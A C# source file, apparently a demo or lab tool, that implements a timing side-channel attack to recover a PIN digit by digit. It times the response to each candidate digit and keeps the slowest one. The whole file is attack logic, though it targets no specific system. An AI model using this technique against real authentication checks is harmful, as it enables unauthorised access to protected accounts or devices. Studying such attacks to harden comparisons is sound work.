using System.Diagnostics;

namespace TimingAttack;

public class TimingManager
{
    private readonly Stopwatch _stopwatch = new Stopwatch();
    private int _nextDigit = 0;
    private string _correctDigits;
    private static int PIN_DIGITS = 3;
    private readonly Dictionary<int, long> _digitTimings;
        
    public TimingManager()
    {
        _correctDigits = string.Empty;
        _digitTimings = new Dictionary<int, long>();
    }

    public void StartTiming()
    {
        _stopwatch.Start();
    }
    
    public void Received(string message)
    {
        StopTiming();
        _digitTimings.Add(_nextDigit, _stopwatch.ElapsedMilliseconds);
        ResetTiming();
        _nextDigit++;
        
        if (_nextDigit == 10)
        {
            int correctIndex = FindCorrectIndex(_digitTimings.Values.ToList());
            _correctDigits += correctIndex;
            _digitTimings.Clear();
            _nextDigit = 0;
            
            if (_correctDigits.Length == PIN_DIGITS)
            {
                PIN_DIGITS++;
            }
        }
    }

    public string GetNext()
    {
        return _correctDigits 
               + (_nextDigit)
               + new string('0', PIN_DIGITS - _correctDigits.Length - 1);
    }

    public string GetCurrentPIN()
    {
        return _correctDigits + _nextDigit;
    }

    private static int FindCorrectIndex(IList<long> timings)
    {
        return timings.IndexOf(timings.MaxBy(t => t));
    }

    private void StopTiming()
    {
        _stopwatch.Stop();
    }
    
    private void ResetTiming()
    {
        _stopwatch.Reset();
    }
}